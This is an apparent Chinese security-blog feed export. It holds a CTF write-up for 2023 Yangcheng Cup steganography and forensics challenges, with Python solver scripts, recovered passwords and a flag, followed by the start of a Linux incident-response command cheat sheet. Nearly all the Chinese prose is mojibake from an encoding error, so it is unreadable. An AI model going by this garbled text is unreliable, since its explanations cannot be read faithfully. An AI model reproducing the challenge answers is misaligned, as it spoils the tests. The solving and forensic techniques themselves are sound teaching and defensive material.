<p>æ‹¿åˆ°<code>KBAUYVCSKR5XK5TYM5SGC3LMNJXWY4BQPBPXSYLVL54TCZLCL5UHUM27NUYTI4JBEEQX2===â€Œâ€</code></p>
<p>å­˜åœ¨é›¶å®½éšå†™ï¼Œè§£å¯†åå¾—åˆ°<code>Matryoshka</code></p>
<p>base32åçŒœæµ‹æ˜¯ç»´å‰å°¼äºš</p>
<p><img src="/img/wp/2023/2023ycb-10.png"></p>
<h2 id="ç¨‹åºçŒ¿Quby"><a href="#ç¨‹åºçŒ¿Quby" class="headerlink" title="ç¨‹åºçŒ¿Quby"></a>ç¨‹åºçŒ¿Quby</h2><p>QUBY.pngå¯ä»¥åˆ†ç¦»å‡ºä¸€ä¸ªå¸¦å¯†ç çš„rar</p>
<p>å›¾ç‰‡æœ¬èº«çš„ä¿¡æ¯æ˜¯å¤å¤šå¯†ç ï¼Œæ ¹æ®ç è¡¨è½¬æ¢å¾—åˆ°<code>HAVEANICEDAY</code></p>
<p>æ³¨æ„1ï¼Œ6ï¼Œ12åˆ†åˆ«è¡¨ç¤ºé¡ºæ—¶é’ˆæ—‹è½¬180Â°ï¼Œ90Â°ï¼Œ0Â°</p>
<p><img src="/img/wp/2023/2023ycb-11.png"></p>
<p>ç„¶åå¯¹å›¾ç‰‡è§£cloacked-pixel</p>
<p><code>python2 lsb.py extract QUBY.png out.txt HAVEANICEDAY</code></p>
<p>å¾—åˆ°å‹ç¼©åŒ…å¯†ç <code>we1c0met0ycbCTF!!!</code>ï¼Œè§£å‹å¾—åˆ°ä¸€æ®µwavå’Œä¸¤å¼ xlsxè¡¨</p>
<p>xlsxè¡¨ä¸­æœ‰å¤–æºæ•°æ®è¢«éšè—äº†ï¼Œå¤§çº¦æ˜¯ä¸­é—´50è¡Œ~1000è¡Œçš„éƒ¨åˆ†è¢«æŠ˜å äº†ï¼Œå±•å¼€å†æ”¹é¢œè‰²èƒ½çœ‹åˆ°ä¸¤ç§ä¸åŒçš„æ•°å­—</p>
<p><img src="/img/wp/2023/2023ycb-12.png"></p>
<p>pythonæå–æ•°å­—åè½¬æ¢æˆ10ï¼Œç”»å›¾åä¸¤å¼ å›¾æ‹¼åœ¨ä¸€èµ·</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> pandas<br>s=<span class="hljs-number">55</span><br>s1=<span class="hljs-number">60</span><br>e=<span class="hljs-number">1023</span><br>e1=<span class="hljs-number">1028</span><br>l=<span class="hljs-number">0</span><br>r=<span class="hljs-number">63</span><br><br><br>img1=Image.new(<span class="hljs-string">&quot;1&quot;</span>,(<span class="hljs-number">1050</span>,<span class="hljs-number">140</span>))<br><br>x1=pandas.read_excel(<span class="hljs-string">&quot;1.xlsx&quot;</span>)<br>x1values=x1.values<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(s-<span class="hljs-number">2</span>,e-<span class="hljs-number">2</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,r):<br>        <span class="hljs-keyword">if</span> x1values[i][j]&gt;=<span class="hljs-number">5</span>:<br>            img1.putpixel((i,j),<span class="hljs-number">255</span>)<br>        <span class="hljs-keyword">else</span>:<br>            img1.putpixel((i,j),<span class="hljs-number">0</span>)<br><br><br>x2=pandas.read_excel(<span class="hljs-string">&quot;2.xlsx&quot;</span>)<br>x2values=x2.values<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(s1-<span class="hljs-number">2</span>,e1-<span class="hljs-number">2</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,r):<br>        <span class="hljs-keyword">if</span> x2values[i][j]&gt;=<span class="hljs-number">5</span>:<br>            img1.putpixel((i-<span class="hljs-number">5</span>,j+<span class="hljs-number">63</span>),<span class="hljs-number">255</span>)<br>        <span class="hljs-keyword">else</span>:<br>            img1.putpixel((i-<span class="hljs-number">5</span>,j+<span class="hljs-number">63</span>),<span class="hljs-number">0</span>)<br>img1=img1.transpose(Image.FLIP_LEFT_RIGHT)<br>img1.save(<span class="hljs-string">&#x27;img.png&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>å¯†ç w0wyoudo4goodj0b</p>
<p><img src="/img/wp/2023/2023ycb-13.png"></p>
<p>å¯¹äºwavçš„å¸¦å¯†ç çš„éšå†™ï¼ŒçŒœæµ‹æ˜¯DeepSound</p>
<p>è§£å¯†å¾—åˆ°<code>flag.txt</code>å’Œ<code>fl4g.txt</code></p>
<p>fl4g.txtä¸­çš„å­—ç¬¦ä¸²å…ˆbase85åœ¨base32ï¼Œå¾—åˆ°<code>sQ+3ja02RchXLUFmNSZoYPlr8e/HVqxwfWtd7pnTADK15Evi9kGOMgbuIzyB64CJ</code></p>
<p>è§‚å¯Ÿå‘ç°æ°å¥½æ˜¯64ä½ï¼Œä»a-z,A-Z,0-9,+,&#x2F;  çŒœæµ‹æ˜¯baseæ¢è¡¨ï¼Œflag.txtä¸­çš„å€¼ä½œä¸ºå¯†æ–‡</p>
<p><img src="/img/wp/2023/2023ycb-14.png"></p>
<h2 id="ä¸¤åªè€è™"><a href="#ä¸¤åªè€è™" class="headerlink" title="ä¸¤åªè€è™"></a>ä¸¤åªè€è™</h2><p>åªç»™äº†ä¸€å¼ å›¾ç‰‡ï¼Œä½†æ˜¯å‘ç°å›¾ç‰‡åé¢çš„IDATçªç„¶å˜å°äº†</p>
<p><img src="/img/wp/2023/2023ycb-15.png"></p>
<p>æ‰€ä»¥å¯ä»¥åˆ æ‰å‰é¢æ‰€æœ‰é•¿65536çš„IDATå—å†åˆ ä¸€ä¸ª34018çš„IDATå—ï¼ˆå‚è€ƒæ­£å¸¸çš„pngå›¾ç‰‡ï¼‰</p>
<p>çˆ†ç ´å®½é«˜ï¼Œå¾—åˆ°å³è¾¹é‚£å¼ å›¾ç‰‡ï¼Œå‘ç°å³è¾¹å¤šäº†ä¸€äº›åƒç´ </p>
<p><img src="/img/wp/2023/2023ycb-16.png"></p>
<p>åŸæ¥çš„å›¾ç‰‡æ˜¯1134x720ï¼Œå˜æˆäº†1144x720</p>
<p>çº¢è‰²éƒ¨åˆ†å…¨æ˜¯(255,0,0)ï¼Œæ—¢ç„¶ä¸¤å›¾ç±»ä¼¼ï¼Œå°±æ”¾stegsolveå°è¯•xorï¼Œå‘ç°å¾ˆå¤šå°åƒç´ ç‚¹ä¸è§„å¾‹åˆ†å¸ƒ</p>
<p>æœ€åå‘ç°å¯ä»¥æå–æ¯è¡Œéé»‘è‰²åƒç´ ç‚¹çš„ä¸ªæ•°å»è½¬å­—ç¬¦ä¸²</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;solved.bmp&#x27;</span>)<br>w,h = img.size<br>count = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(h):<br>    tmp = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w):<br>        pixel = img.getpixel((j,i))<br>        <span class="hljs-keyword">if</span>(pixel != (<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)):<br>            tmp += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span>(tmp!=<span class="hljs-number">10</span>):<br>        count.append(tmp-<span class="hljs-number">10</span>)<br><span class="hljs-built_in">print</span>(count)<br><br>count = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(num) <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> count)<br><span class="hljs-built_in">print</span>(count)<br><span class="hljs-comment">#[68, 65, 83, 67, 84, 70, 123, 116, 87, 111, 95, 116, 49, 103, 101, 114, 115, 95, 114, 85, 110, 95, 102, 64, 115, 116, 125]</span><br><span class="hljs-comment">#DASCTF&#123;tWo_t1gers_rUn_f@st&#125;</span><br></code></pre></td></tr></table></figure>


<h2 id="Easy-VMDK"><a href="#Easy-VMDK" class="headerlink" title="Easy_VMDK"></a>Easy_VMDK</h2><blockquote>
<p>å°æ˜è¿™æ¬¡ä½¿ç”¨äº†32Bytesçš„éšæœºå¯†ç ï¼Œè¿™æ¬¡æ€»ä¸ä¼šè¢«çˆ†ç ´å‡ºæ¥äº†å§ï¼ï¼<br>å°æ˜å‹ç¼©äº†å¥½äº†é¢˜ç›®åï¼Œä»–å‘ç°å‹ç¼©åå¤§å°æ¯”å‹ç¼©å‰è¿˜å¤§å•Šï¼Œè¿™ä¸å°±æ²¡æœ‰å‹ç¼©å•Šï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆå•Šï¼</p>
</blockquote>
<p>å¯¹å‹ç¼©åŒ…è¿›è¡Œæ˜æ–‡æ”»å‡»ï¼Œæœ¬åœ°çœ‹ä¸‹è‡ªå·±çš„å‡ ä¸ªvmdkæ–‡ä»¶å¤´ï¼Œå‘ç°å‡ä¸º<code>4B 44 4D 56 01 00 00 00 03 00 00 00</code></p>
<p><img src="/img/wp/2023/2023ycb-17.png"></p>
<p>æ‹¿åˆ°ä¸€ä¸ª<code>flag.zip</code>å’Œ<code>key.txt</code></p>
<p>flag.zipåˆ†ç¦»å‡ºä¸€ä¸ªå¸¦å¯†ç çš„å‹ç¼©åŒ…å’Œä¸€ä¸ªpyè„šæœ¬ï¼Œå…¶ä¸­æ˜¯key.txtçš„åŠ å¯†è¿‡ç¨‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> binascii<br><br><br>img = cv2.imread(<span class="hljs-string">&quot;key.png&quot;</span>)<br>r, c = img.shape[:<span class="hljs-number">2</span>]<br><span class="hljs-built_in">print</span>(r, c)<br><span class="hljs-comment"># 137 2494</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;key.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(r):<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(c):<br>            uu_byte = binascii.a2b_uu(<span class="hljs-string">&#x27;, &#x27;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> x: <span class="hljs-built_in">str</span>(x), img[y, x])) + <span class="hljs-string">&quot;\n&quot;</span>)<br>            f.write(base64.b64encode(uu_byte).decode() + <span class="hljs-string">&quot;\n&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>è§£å¯†è¿‡ç¨‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-comment"># è¯»å– key.txt æ–‡ä»¶å†…å®¹</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;key.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    lines = f.readlines()<br><br><span class="hljs-comment"># åˆ›å»ºç©ºç™½å›¾åƒ</span><br>img = np.zeros((<span class="hljs-number">137</span>, <span class="hljs-number">2494</span>), dtype=np.uint8)<br><br><span class="hljs-comment"># è¿˜åŸå›¾åƒåƒç´ å€¼</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">137</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2494</span>):<br>        <span class="hljs-comment"># è§£ç  base64 æ•°æ®</span><br>        encoded_data = lines[y * <span class="hljs-number">2494</span> + x].strip()<br>        decoded_data = base64.b85decode(encoded_data.encode())<br><br>        <span class="hljs-comment"># è·å–åƒç´ å€¼</span><br>        pixel_value = <span class="hljs-built_in">int</span>.from_bytes(decoded_data, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>) % <span class="hljs-number">256</span><br><br>        <span class="hljs-comment"># è®¾ç½®å›¾åƒåƒç´ </span><br>        img[y, x] = pixel_value<br><br><span class="hljs-comment"># ä¿å­˜è¿˜åŸåçš„å›¾åƒ</span><br>cv2.imwrite(<span class="hljs-string">&quot;restored_key.png&quot;</span>, img)<br></code></pre></td></tr></table></figure>

<p><img src="/img/wp/2023/2023ycb-18.png"></p>
<p>ç”¨è¿™ä¸ªå¯†ç å»è§£å‹ï¼Œå¾—åˆ°flag</p>
<h2 id="GIFuck"><a href="#GIFuck" class="headerlink" title="GIFuck"></a>GIFuck</h2><p>æ ¹æ®å¸§é•¿åˆ‡å‰²ï¼Œåˆ©ç”¨ocrè¿›è¡Œæ‰¹é‡è¯†åˆ«</p>
<p><code>++++[-&gt;++++&lt;]&gt;[-&gt;++++++&lt;]&gt;-[-&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]+++&lt;++&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+++&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]&lt;+++[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]&lt;+++&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;++[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;++&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]&lt;+++&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;+++[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;+++[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;][-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;+++[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;++[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;+++[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;+++[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;][-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+++&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;+++[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;][-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;+++[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;+++[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+++&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]&lt;&lt;+++++++++[-&gt;+++++++++&lt;]&gt;++.&lt;+++++[-&gt;+++++&lt;]&gt;+++.+++..+++++++.&lt;+++++++++[-&gt;---------&lt;]&gt;--------.&lt;++++++++[-&gt;++++++++&lt;]&gt;++.&lt;++++[-&gt;++++&lt;]&gt;+++.-.&lt;+++++++++[-&gt;---------&lt;]&gt;---.&lt;+++++++++[-&gt;+++++++++&lt;]&gt;++++++++.&lt;+++[-&gt;---&lt;]&gt;-.++++++.---.&lt;+++++++++[-&gt;---------&lt;]&gt;-.&lt;++++++++[-&gt;++++++++&lt;]&gt;++++++.++++++.&lt;+++[-&gt;---&lt;]&gt;--.++++++.&lt;++++++++[-&gt;--------&lt;]&gt;-------.&lt;++++++++[-&gt;++++++++&lt;]&gt;+++++++++.&lt;+++[-&gt;+++&lt;]&gt;+.&lt;+++++++++[-&gt;---------&lt;]&gt;--.&lt;++++++++[-&gt;++++++++&lt;]&gt;++++++++++++++.+.+++++.&lt;+++++++++[-&gt;---------&lt;]&gt;---.&lt;++++++++[-&gt;++++++++&lt;]&gt;++++++++.---.&lt;+++[-&gt;+++&lt;]&gt;++++.&lt;+++[-&gt;---&lt;]&gt;----.&lt;+++++++[-&gt;-------&lt;]&gt;------.[-]&lt;</code></p>
<p>ä¼šè¾“å‡º<code>Sorry but your flag is not here.</code></p>
<p>çœŸæ­£çš„flagè—åœ¨å†…å­˜ä¸­</p>
<p><img src="/img/wp/2023/2023ycb-19.png"></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2023</tag>
        <tag>ç¾ŠåŸæ¯</tag>
      </tags>
  </entry>
  <entry>
    <title>åº”æ€¥å“åº”ä¸­çš„å¸¸ç”¨å‘½ä»¤</title>
    <url>/posts/4dcb61d1/</url>
    <content><![CDATA[<h1 id="åº”æ€¥å“åº”"><a href="#åº”æ€¥å“åº”" class="headerlink" title="åº”æ€¥å“åº”"></a>åº”æ€¥å“åº”</h1><p><strong>åº”æ€¥å“åº”æµç¨‹</strong></p>
<p>äº‹ä»¶åˆ¤æ–­ï¼šåˆ¤æ–­æ˜¯å¦æ˜¯å®‰å…¨äº‹ä»¶ï¼Œä½•ç§å®‰å…¨äº‹ä»¶ï¼Œå‹’ç´¢ã€æŒ–çŸ¿ã€æ–­ç½‘ã€DDosç­‰ç­‰</p>
<p>ä¸´æ—¶å¤„ç½®ï¼šç»™å‡ºå®¢æˆ·ä¸´æ—¶å¤„ç½®å»ºè®®ï¼Œæ–­ç½‘éš”ç¦»ï¼Œä¿æŠ¤ç°åœºç¯å¢ƒ</p>
<p>ä¿¡æ¯æ”¶é›†åˆ†æï¼šæ”¶é›†å®¢æˆ·ä¿¡æ¯å’Œä¸­æ¯’ä¸»æœºä¿¡æ¯ï¼ŒåŒ…æ‹¬æ ·æœ¬ï¼Œæ—¥å¿—åˆ†æã€è¿›ç¨‹åˆ†æã€å¯åŠ¨é¡¹åˆ†æ</p>
<p>æ¸…ç†å¤„ç½®ï¼šç›´æ¥æ€æ‰è¿›ç¨‹ï¼Œåˆ é™¤æ–‡ä»¶ï¼Œæ‰“è¡¥ä¸ï¼ŒæŠ‘æˆ–æ˜¯ä¿®å¤æ–‡ä»¶</p>
<p>äº§å‡ºæŠ¥å‘Šï¼šæ•´ç†å¹¶è¾“å‡ºå®Œæ•´çš„å®‰å…¨äº‹ä»¶æŠ¥å‘Š</p>
<h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><h2 id="é‡è¦æ–‡ä»¶å’Œç›®å½•"><a href="#é‡è¦æ–‡ä»¶å’Œç›®å½•" class="headerlink" title="é‡è¦æ–‡ä»¶å’Œç›®å½•"></a>é‡è¦æ–‡ä»¶å’Œç›®å½•</h2><table>
<thead>
<tr>
<th>æ–‡ä»¶å</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>&#x2F;etc&#x2F;passwd</td>
<td>ç”¨æˆ·ä¿¡æ¯æ–‡ä»¶</td>
</tr>
<tr>
<td>&#x2F;etc&#x2F;crontab</td>
<td>å®šæ—¶ä»»åŠ¡æ–‡ä»¶</td>
</tr>
<tr>
<td>&#x2F;etc&#x2F;anacrontab</td>
<td>å¼‚æ­¥å®šæ—¶ä»»åŠ¡</td>
</tr>
<tr>
<td>&#x2F;etc&#x2F;rc.d&#x2F;rc.local</td>
<td>å¼€æœºå¯åŠ¨é¡¹</td>
</tr>
<tr>
<td>&#x2F;etc&#x2F;hosts</td>
<td>æœ¬åœ°IPåœ°å€åŸŸåè§£ææ–‡ä»¶</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;btmp</td>
<td>ç™»å½•å¤±è´¥æ—¥å¿—</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;wtmp</td>
<td>åŒ…å«ç”¨æˆ·ç™»å½•æ—¥å¿—</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;utmp</td>
<td>å½“å‰ç™»é™†ç³»ç»Ÿçš„ç”¨æˆ·ä¿¡æ¯</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;cron</td>
<td>å®šæ—¶ä»»åŠ¡æ‰§è¡Œæ—¥å¿—</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;lastlog</td>
<td>æ‰€æœ‰ç”¨æˆ·æœ€è¿‘ç™»å½•ä¿¡æ¯</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;secure</td>
<td>éªŒè¯ï¼Œæˆæƒç­‰æ—¥å¿—</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>ç›®å½•</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>&#x2F;root&#x2F;.ssh</td>
<td>rootç”¨æˆ·sshå…¬é’¥å’Œç§é’¥</td>
</tr>
<tr>
<td>&#x2F;tmp</td>
<td>ç³»ç»Ÿæˆ–ç”¨æˆ·ä¸´æ—¶æ–‡ä»¶çš„ç›®å½•</td>
</tr>
<tr>
<td>&#x2F;etc&#x2F;init.d</td>
<td>å¼€æœºå¯åŠ¨é¡¹</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log</td>
<td>æ—¥å¿—é»˜è®¤å­˜æ”¾ç›®å½•</td>
</tr>
</tbody></table>
<h2 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h2><p>æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶å¹¶æ’åº<br><code>ls -alt</code></p>
<p><img src="/img/hw/yjxy-1.png"></p>
<p>æŸ¥çœ‹ç³»ç»Ÿå†…å­˜ä½¿ç”¨æƒ…å†µ<br><code>free -h</code></p>
<p><img src="/img/hw/yjxy-2.png"></p>
<p>æŸ¥çœ‹ç³»ç»Ÿè¿›ç¨‹åŠå­è¿›ç¨‹<br><code>ps auxf</code>ã€<code>top</code></p>
<p><img src="/img/hw/yjxy-3.png"><br><img src="/img/hw/yjxy-4.png"></p>
<p>æŸ¥çœ‹ç½‘ç»œè¿æ¥<br><code>netstat -antpl</code></p>
<p><img src="/img/hw/yjxy-5.png"></p>
<p>æ ¹æ®pidä½¿ç”¨<code>ls -alh /proc/pid</code>å‘½ä»¤æŸ¥çœ‹å¯¹åº”çš„å¯æ‰§è¡Œç¨‹åº</p>
<p><img src="/img/hw/yjxy-6.png"></p>
<p>æŸ¥è¯¢ç«¯å£æ‰“å¼€çš„æ–‡ä»¶<br><code>lsof -i:port</code></p>
<p>æŸ¥è¯¢è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶<br><code>lsof -p pid</code></p>
<p>æŸ¥è¯¢ç”¨æˆ·æ‰“å¼€çš„æ–‡ä»¶<br><code>lsof -u root</code></p>
<p><img src="/img/hw/yjxy-7.png"></p>
<p>ä¿®æ”¹æ–‡ä»¶å±æ€§<br><code>chattr</code></p>
<p>æ˜¾ç¤ºæ–‡ä»¶å±æ€§<br><code>lsattr</code></p>
<p><img src="/img/hw/yjxy-8.png"></p>
<p>æ’æŸ¥å¯åŠ¨é¡¹<br><code>cat /etc/rc.local</code><br><code>ls -alt /etc/profile.d/*.sh</code></p>
<p><img src="/img/hw/yjxy-9.png"></p>
<p>æŸ¥çœ‹æ‰€æœ‰ç”¨æˆ·çš„å®šæ—¶ä»»åŠ¡<br><code>cat /etc/passwd | cut -f 1 -d : | xargs -I &#123;&#125; crontab -l -u &#123;&#125;</code><br><code>ls -altr /var/spool/cron/*</code></p>
<p><img src="/img/hw/yjxy-10.png"></p>
<p>æŸ¥çœ‹å†å²å‘½ä»¤<br><code>history</code><br><code>cat ~/.bash_history</code></p>
<p><img src="/img/hw/yjxy-11.png"></p>
<p>æ ¡éªŒè½¯ä»¶åŒ…<br><code>rpm -Va</code><br><code>dpkg --verify</code></p>
<table>
<thead>
<tr>
<th>å€¼</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>S</td>
<td>è¡¨ç¤ºå¯¹åº”æ–‡ä»¶çš„å¤§å°ä¸ä¸€è‡´</td>
</tr>
<tr>
<td>M</td>
<td>è¡¨ç¤ºå¯¹åº”æ–‡ä»¶æƒé™å’Œæ‰€æœ‰æƒä¸ä¸€æ ·</td>
</tr>
<tr>
<td>5</td>
<td>è¡¨ç¤ºå¯¹åº”æ–‡ä»¶çš„MD5ä¸ä¸€è‡´</td>
</tr>
<tr>
<td>D</td>
<td>è¡¨ç¤ºæ–‡ä»¶çš„è®¾å¤‡å·å’Œé©±åŠ¨ç¨‹åºä¸ä¸€è‡´</td>
</tr>
<tr>
<td>L</td>
<td>è¡¨ç¤ºæ–‡ä»¶çš„ç¬¦å·è¿æ¥å†…å®¹ä¸ä¸€è‡´</td>
</tr>
<tr>
<td>U</td>
<td>è¡¨ç¤ºæ–‡ä»¶æ‰€æœ‰è€…ä¸ä¸€è‡´</td>
</tr>
<tr>
<td>G</td>
<td>è¡¨ç¤ºæ–‡ä»¶ç¾¤ç»„ä¸ä¸€è‡´</td>
</tr>
<tr>
<td>T</td>
<td>è¡¨ç¤ºæ–‡ä»¶çš„ä¿®æ”¹æ—¶é—´ä¸ä¸€è‡´</td>
</tr>
</tbody></table>
<blockquote>
<p>è½¯ä»¶æ›´æ–°ä¼šå¯¼è‡´å¤§å°æˆ–MD5ä¸ä¸€è‡´ï¼ŒåŒæ—¶å‡ºç°SM5éœ€è¦æ³¨æ„</p>
</blockquote>
<p><img src="/img/hw/yjxy-12.png"></p>
<p>æŸ¥çœ‹æ–‡ä»¶ï¼ˆç›®å½•ï¼‰è¯¦ç»†ä¿¡æ¯<br><code>stat</code></p>
<p><img src="/img/hw/yjxy-13.png"></p>
<p>æŸ¥æ‰¾å½“å‰ç›®å½•ä¸‹ï¼ŒæŒ‡å®šå¤©æ•°å†…ä¿®æ”¹çš„æŒ‡å®šç±»å‹æ–‡ä»¶<br><code>find / -mtime 0 -name *.jsp</code></p>
